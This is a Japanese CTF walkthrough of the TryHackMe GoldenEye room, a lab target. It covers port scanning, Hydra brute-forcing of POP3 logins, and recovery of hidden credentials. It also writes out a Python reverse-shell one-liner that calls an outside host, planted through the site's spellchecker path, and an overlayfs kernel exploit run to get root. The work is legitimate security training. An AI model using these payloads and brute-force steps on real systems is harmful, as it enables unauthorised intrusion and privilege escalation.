# GoldenEye CTF

https://tryhackme.com/room/goldeneye

## Enumeration

```shell
TARGET=10.201.42.154
sudo bash -c "echo $TARGET   goldeneye.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
```

```sh
sudo nmap -sS -sV -p25,80,55006,55007 $TARGET

PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d
```

### web

```txt
Severnaya Auxiliary Control Station
****TOP SECRET ACCESS****
Accessing Server Identity
Server Name:....................
GOLDENEYE

User: UNKNOWN
Naviagate to /sev-home/ to login
```

terminal.js

```js
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

CyberChefで、`From HTML Entity` でデコードするとパスワードになる。  
このパスワードを使ってサイトにログインせよとの指示。

/sev-home/ でログイン

```txt
GoldenEye
GoldenEyeは、ソ連の極秘宇宙兵器プロジェクトです。アクセス権限をお持ちということは、間違いなく極秘のクリアランスを有し、GoldenEye認定ネットワークオペレーター（GNO）の資格を有することになります。

GoldenEyeシステムの管理者になるためのオンラインGoldenEyeオペレータートレーニングを受講するには、資格のあるGNOスーパーバイザーにメールでお問い合わせください。

秘匿性によるセキュリティは非常に効果的であるため、POP3サービスはデフォルト以外の非常に高いポートで動作するように設定されています。
```

## mail

Thunderbirdでユーザー名とパスワードを設定したが、認証が通らなかった。

POP3をブルートフォース。borisのメールパスワード判明。

```sh
root@ip-10-201-82-101:~# hydra -l boris -P /usr/share/wordlists/fasttrack.txt $TARGET pop3 -t 30 -s 55007
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 02:35:49
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 222 login tries (l:1/p:222), ~8 tries per task
[DATA] attacking pop3://10.201.42.154:55007/
[55007][pop3] host: 10.201.42.154   login: boris   password: [REDACTED]
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 1 to do in 00:01h, 29 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 02:37:02
```

### 55007 POP3

受信。

root@127.0.0.1.goldeneye

```
Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
```

natalya@ubuntu

```
Boris, I can break your codes!
```

alec@janus.boss

```
Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

### 他のユーザーのパスワードブルートフォース

同様に、natalya のパスワードも判明する。

root@ubuntu

```
Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
```

root@ubuntu

```
Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle 🙂

Ok, user creds are:

username: xenia
password: [REDACTED]

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

hosts追加。

```sh
TARGET=10.201.42.154
sudo bash -c "echo $TARGET   severnaya-station.com/gnocertdir >> /etc/hosts"
```

## severnaya-station.com/gnocertdir

xeniaとしてログイン可能。

見つかったDoakユーザーのパスワードをPOP3でブルートフォース成功。

### Doak POP3

doak@ubuntu

```
James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: [REDACTED]
```

dr_doak で severnaya-station.com/gnocertdir にログインすると、テキストファイルが見つかる。

```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

jpgをexiftoolにかけると、Base64文字列が出てくる。

```
Image Description               : [REDACTED]
```

デコードするとパスワードになり、adminとしてログインできる。

1. Server -> System Paths -> Path to aspell でリバースシェルを仕込む。

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.146.32",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

2. Plugins -> Text Editors -> TinyMCE HTML Editor で PSSpellShell を選択

3. ブログ編集画面でスペルチェッカーボタンを押すと、トリガーされる。

```sh
$ nc -lnvp 8888                  
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.42.154] 52185
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

### overlayfs

https://www.exploit-db.com/exploits/37292

```sh
www-data@ubuntu:/var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

```sh
www-data@ubuntu:/tmp$ cc ofs.c -o ofs
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

## 振り返り

- 長い。ガイド付きでなければ極めて困難だったと思う。特にリバースシェルのところ。
- ブルートフォースはリスト選びが難しい。
- カーネルが古かったら overlayfs を試したい。
